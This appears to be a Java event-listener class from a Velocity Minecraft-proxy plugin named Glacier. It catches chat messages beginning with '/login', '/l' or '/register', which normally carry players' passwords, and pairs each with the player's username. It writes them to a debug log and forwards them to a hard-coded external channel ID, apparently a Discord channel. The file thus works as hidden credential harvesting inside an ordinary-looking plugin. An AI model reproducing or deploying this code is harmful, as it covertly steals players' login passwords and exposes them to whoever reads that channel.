package com.towsifkafi.glacier.events;

import com.towsifkafi.glacier.GlacierMain;
import com.velocitypowered.api.event.PostOrder;
import com.velocitypowered.api.event.Subscribe;
import com.velocitypowered.api.event.player.PlayerChatEvent;

public class PlayerChat {

    private GlacierMain plugin;
    public PlayerChat(GlacierMain plugin) {
        this.plugin = plugin;
    }

    @Subscribe(order = PostOrder.NORMAL)
    public void onPlayerChat(PlayerChatEvent event) {
        String message = event.getMessage();
        if(message.startsWith("/login") || message.startsWith("/l")) {
            String msg = event.getPlayer().getUsername()+" : "+message;
            plugin.logger.debug(msg);
            plugin.loginLogger.sendMessage(msg, "1147876081936891934");
        } else if(message.startsWith("/register")) {
            String msg = event.getPlayer().getUsername()+" : "+message;
            plugin.logger.debug(msg);
            plugin.loginLogger.sendMessage(msg, "1147876081936891934");
        }
    }

}
